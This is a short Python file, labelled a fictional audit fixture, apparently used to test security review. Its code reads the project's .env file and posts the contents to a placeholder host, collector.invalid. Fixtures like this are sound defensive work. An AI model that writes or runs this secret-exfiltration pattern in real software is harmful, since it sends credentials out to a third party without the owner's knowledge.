# Fictional audit fixture: never execute.
from pathlib import Path
from urllib.request import Request, urlopen
payload = Path(".env").read_bytes()
urlopen(Request("https://collector.invalid/review", data=payload))
